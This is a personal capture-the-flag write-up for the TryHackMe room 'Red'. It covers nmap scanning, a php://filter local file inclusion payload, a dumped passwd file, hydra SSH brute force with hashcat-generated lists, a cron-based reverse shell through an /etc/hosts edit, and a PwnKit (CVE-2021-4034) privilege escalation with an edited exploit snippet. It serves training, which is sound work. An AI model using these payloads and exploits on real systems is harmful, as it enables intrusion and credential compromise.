---
created: 2026-03-02
tags:
  - note
  - journal
  - cyberStuff
title: red
draft: false
date:
subiect:
dificultate: 1
amuca: false
link:
lastmod: 2026-03-02T13:34:06.110Z
categories: ["writeups"]
---
link : <https://tryhackme.com/room/redisl33t>

note for the end: on the final script used for the privillege escalation , the script has to be modified as shown below , right at the end of the script :

```
environ_p = (c_char_p * len(environ))()
environ_p[:] = environ

print('[+] Calling execve()')

libc.execve(b'/home/red/.git/pkexec', c_char_p(None), environ_p)

```

desc :![](https://share.note.sx/files/h5/h5x35x2i9crzu2i43h39.png)\
![](https://share.note.sx/files/u8/u8e1pbubq8duwanykz4u.png)\
scanned the ip with the following command\
\`sudo nmap -v --min-rate 10000 \$IP -p-

just cause it short , and it guves us ssh and http open , cool

lets run a version scan now\
\`sudo nmap -v -sVC -oN nmap.txt \$IP -p 22,80

![](https://share.note.sx/files/nn/nnjcwrartpfdqv7v2kii.png)\
cool open ssh , so we have an ubuntu machine\
\`\
lets check the site

![](https://share.note.sx/files/7l/7lv6qf74n33d4tdznrzn.jpg)\
mhmm <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion>

lets use some burp\
![](https://share.note.sx/files/zz/zz1duq434w4y360sftsc.png)\
i used burp to try to see etc/passwd butit didnt worked

i took a payload from the following link:<https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion>

php://filter/convert.base64-encode/resource=index.php

and i found something

and is some source code in base64

![](https://share.note.sx/files/fo/fonwiyjgx18rpx95gkh0.png)\
i edited the payload a lil bit to read file and i manged to acess the passwd file

passwd file :\
root:x:0:0:root:/root:/bin/bash\
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\
bin:x:2:2:bin:/bin:/usr/sbin/nologin\
sys:x:3:3:sys:/dev:/usr/sbin/nologin\
sync:x:4:65534:sync:/bin:/bin/sync\
games:x:5:60:games:/usr/games:/usr/sbin/nologin\
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin\
syslog:x:104:110::/home/syslog:/usr/sbin/nologin\
\_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false\
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin\
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin\
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin\
pollinate:x:110:1::/var/cache/pollinate:/bin/false\
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin\
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\
blue:x:1000:1000:blue:/home/blue:/bin/bash\
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\
red:x:1001:1001::/home/red:/bin/bash

then i used the following lfi hunter script :\
<https://github.com/hadrian3689/lfi_hunter.git>

then i did ![](https://share.note.sx/files/hx/hxufpxriolnx8jhvblyk.png)

and if we cat unix it look like this\
![](https://share.note.sx/files/uv/uv7cvk81fq7o9oak5y20.png)

note : first time it didnt\
![](https://share.note.sx/files/r2/r2kt7p3wcm9ngvbhbwx3.png)\
and we do find an history file for blue

lets try to read the file from burp

![](https://share.note.sx/files/qq/qq62942i17ho6jx8ac91.png)\
also it is shown that there is a reminder file , lets try to look into it\
![](https://share.note.sx/files/gw/gwca2e1ik72sy7l5rh52.png)

when we run it we find the following\
![](https://share.note.sx/files/35/355laeh95i5i940hnkl2.png)\
cool

sup3r\_p@s\$w0rd!

i runned the following command to create a list of password to bruteforce

hashcat --stdout pass.txt -r /usr/share/hashcat/rules/best64.rule > passlist.txt

then i used hydra to bruteforce

hydra -l blue -P passlist.txt \$IP ssh

then we found that the password is :\
![](https://share.note.sx/files/b2/b29brme4316i097k01eb.png)

the password if `sup3r_p@s$w0sup3r_p@s$w0`\
then we can ssh to it\
![](https://share.note.sx/files/vq/vq7qgzmny907bvmc4bk7.png)\
and we are in as a blue team member

![](https://share.note.sx/files/6l/6lvfz53fta1n3kfr3p69.png)

oooo interesting , i think its a cronjob runnning to show those messages\
![](https://share.note.sx/files/ee/eev898c9jikt41gwrqeb.png)\
interesting\
![](https://share.note.sx/files/d6/d6vb0luilddgezqpm9ey.png)\
and it disconeted us , niceee

i runned again hydra nad i found its the same password\
![](https://share.note.sx/files/z8/z8ckynd1w1vd6m2jfm2t.png)

a simple way to bypass the kicking is by adding the -T at the finnaly of the ssh\
![](https://share.note.sx/files/b0/b08ktej0j66g8bser4u8.png)\
like here , this is a common king of the hill tip

after i checked the cronjobs i saw that the machine connect to a server named redrules.thm\
so i modified /etc/hosts ,added my ip address and rev shell to the machine , as shown\
![](https://share.note.sx/files/2m/2my1cq6evi6qvuyjixco.png)\
![](https://share.note.sx/files/8i/8ivl6pjstfh3m4gli515.png)

also if we ls we can find the second flag\
![](https://share.note.sx/files/g0/g0ku1572n4kiomaayigh.png)

then u just have to copy paste the following script using vim and run it with python to priv esc

i sugerate to create an http server on your machine then take the script with wget , cause it gived me a very big headache to copy paste with vim\
<https://github.com/joeammond/CVE-2021-4034?tab=readme-ov-file>

now u are root and can take the last flag
